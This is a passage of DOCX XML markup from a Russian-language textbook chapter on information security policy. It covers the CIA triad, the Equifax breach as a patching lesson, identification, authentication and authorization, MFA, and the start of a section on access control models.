        <w:t>**Кто** имеет доступ к **чему**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Как** защищаются данные (шифрование, резервное копирование, антивирусы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что делать**, если произошёл инцидент (взлом, утечка, вирус)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Какие штрафы** за нарушение (увольнение, штраф, тюрьма — да, серьёзно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем нужна ПБ?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Защита данных** — чтобы конкуренты не украли твою базу клиентов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Минимизация рисков** — чтобы хакеры не зашифровали все серверы и не требовали выкуп в биткоинах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Соответствие законам** — GDPR (Европа), 152-ФЗ (Россия), HIPAA (США для медицины). Если утекли персональные данные, а политики не было — штраф до 4% годового оборота компании</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Репутация** — один взлом, и клиенты уходят к конкурентам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Разграничение ответственности** — чтобы системный администратор не свалил вину на разработчиков, а разработчики — на бухгалтерию</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2017 году Equifax (кредитное бюро) потеряло данные 147 миллионов человек. Причина? </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Не обновили Apache Struts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (CVE-2017-5638). Патч вышел за 2 месяца до взлома, но админы забили. Итог: штраф $700 миллионов, акции упали на 35%, CEO уволили. Если бы была </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>адекватная политика обновлений</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (и её исполняли), этого можно было избежать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Компоненты политики безопасности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Организационные документы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Политика информационной безопасности (главный документ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регламенты (как делать резервное копирование, как реагировать на инциденты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Инструкции для сотрудников (как выбирать пароль, что делать с USB-флешками)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Роли и ответственность</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кто отвечает за безопасность (CISO — Chief Information Security Officer)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кто мониторит логи (Security Operations Center, SOC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кто реагирует на инциденты (CERT/CSIRT)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Технические меры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (о них подробнее ниже)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Обучение персонала</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Тренинги по фишингу (чтобы сотрудники не кликали на "Ваш аккаунт заблокирован, введите пароль здесь")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Инструктажи по работе с конфиденциальной информацией</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5. Аудит и мониторинг</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверка логов (кто что открывал)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регулярные тесты на проникновение (pentesting)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Анализ инцидентов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1.2. CIA Triad — Святая Троица информационной безопасности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вся информационная безопасность строится на трёх китах (или трёх буквах):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CIA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Confidentiality</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Конфиденциальность) + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Integrity</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Целостность) + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Availability</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Доступность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Не путай с ЦРУ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Central Intelligence Agency), хотя они тоже про безопасность 😏</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Конфиденциальность (Confidentiality)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Информация доступна </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>только авторизованным пользователям</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры нарушения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Утечка базы паролей на форум хакеров</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сотрудник слил список клиентов конкурентам за $10,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>NSA читает твою переписку в WhatsApp (ну, теоретически 🤷)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защищают</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование** (AES-256, RSA, см. главу 9.02)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Контроль доступа** (не каждый может открыть секретные файлы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Аутентификация** (пароли, 2FA, биометрия)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Медицинские записи. Только врач и пациент должны видеть диагноз. Если медсестра из регистратуры открыла твою карту из любопытства — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нарушение конфиденциальности</w:t>
      </w:r>
      <w:r>
        <w:t>. В США за это по закону HIPAA могут дать штраф $50,000 или год тюрьмы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Целостность (Integrity)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Информация </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не изменена</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> несанкционированно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры нарушения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер изменил оценки в базе университета (с двойки на пятёрку)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Man-in-the-Middle атака: злоумышленник изменяет содержимое банковского платежа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вирус удалил системные файлы Windows</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защищают</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Цифровые подписи** (проверка, что файл не изменён)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хэши** (SHA-256: если файл изменён, хэш изменится)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Контроль версий** (Git, резервное копирование)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Права доступа** (только администратор может изменять критические файлы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Windows Update. Когда ты скачиваешь обновление, Windows проверяет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>цифровую подпись Microsoft</w:t>
      </w:r>
      <w:r>
        <w:t>. Если подпись неверна, обновление не установится. Это защита от того, чтобы злоумышленник не подсунул тебе "обновление" с трояном.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Доступность (Availability)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Информация </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>доступна</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> легитимным пользователям, когда им нужно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры нарушения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DDoS-атака**: сайт лежит, потому что злоумышленники засрали его ботами (миллионы запросов в секунду)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ransomware**: вирус зашифровал все файлы, требует выкуп в биткоинах. Пока не заплатишь — данные недоступны</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отказ оборудования**: жёсткий диск сгорел, а резервной копии нет</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защищают</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Резервное копирование** (backup) — регулярные копии данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Репликация** — несколько копий базы данных на разных серверах (см. главу 4.01)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DDoS-защита** — Cloudflare, Akamai фильтруют вредоносный трафик</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отказоустойчивость** (fault tolerance) — RAID-массивы, резервные серверы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Gmail. Google обещает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>99.9% uptime</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (SLA — Service Level Agreement). Это значит, что сервис может быть недоступен максимум </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>8.76 часов в год</w:t>
      </w:r>
      <w:r>
        <w:t>. Для этого у них тысячи серверов в дата-центрах по всему миру, репликация данных, автоматическое переключение на резервные системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Баланс между CIA</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: эти три принципа </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>конфликтуют</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хочешь максимальной **конфиденциальности**? Шифруй всё AES-256, отключай интернет, храни данные в бункере под землёй. Но тогда **доступность** упадёт — пользователям будет неудобно работать.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хочешь максимальной **доступности**? Открой публичный доступ к базе данных, без паролей. Но тогда **конфиденциальность** = 0.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хочешь максимальной **целостности**? Запрети всем изменять файлы. Но тогда невозможно работать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача политики безопасности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — найти </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>баланс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> между CIA в зависимости от требований бизнеса.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Банк. Конфиденциальность и целостность критичны (нельзя, чтобы кто-то украл деньги или изменил баланс). Доступность тоже важна (клиенты должны иметь доступ к счетам), но если выбирать между "временно отключить систему" и "рискнуть утечкой данных" — банк выберет отключение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1.3. Идентификация, Аутентификация, Авторизация (ИАА)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Перед тем как выдавать доступ, система должна пройти три шага:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Идентификация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кто ты?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ты называешь свой логин (username)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: вводишь `ivan.petrov@example.com`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Аутентификация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Докажи, что это правда ты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ты подтверждаешь свою личность (пароль, отпечаток пальца, код из SMS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: вводишь пароль `MySecretPassword123`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Авторизация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что тебе разрешено делать?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Система проверяет твои права доступа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: ты можешь читать файлы в папке `/home/ivan`, но не можешь удалять системные файлы в `/etc`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Идентификация** — ты подходишь к охраннику клуба и говоришь "Я Иван"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Аутентификация** — показываешь паспорт, чтобы доказать, что ты правда Иван</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Авторизация** — охранник проверяет список гостей. Если ты VIP, тебя пускают в лаунж. Если нет — только в общий зал.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Факторы аутентификации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что-то, что ты знаешь</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (knowledge):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пароль, PIN-код, секретный вопрос ("Девичья фамилия матери")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что-то, что у тебя есть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (possession):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Смартфон (код из SMS), токен (USB-ключ YubiKey), банковская карта</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что-то, что ты есть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (inherence):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отпечаток пальца, сканирование лица (Face ID), радужка глаза, голос</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Многофакторная аутентификация (MFA / 2FA)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2FA (Two-Factor Authentication)** — два фактора (например, пароль + код из SMS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MFA (Multi-Factor Authentication)** — два или более фактора</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Gmail. Ты вводишь пароль (фактор 1: что ты знаешь), затем вводишь код из Google Authenticator на смартфоне (фактор 2: что у тебя есть). Даже если кто-то украдёт твой пароль, без смартфона он не зайдёт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1.4. Модели управления доступом</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Политика безопасности определяет, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>кто</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> имеет доступ к </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>чему</w:t>
      </w:r>
      <w:r>
        <w:t>. Для этого используют разные модели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. DAC (Discretionary Access Control) — Дискреционное управление</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t>: Владелец ресурса сам решает, кому давать доступ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Linux/Windows права доступа к файлам. Ты создал файл `secret.txt`, ты решаешь: дать ли доступ другу Васе (read-only) или нет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Гибкость: каждый управляет своими файлами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Просто реализовать</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет централизованного контроля: пользователи могут случайно (или специально) дать доступ не тем людям</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не подходит для высокоуровневой защиты (военные, банки)</w:t>
      </w:r>
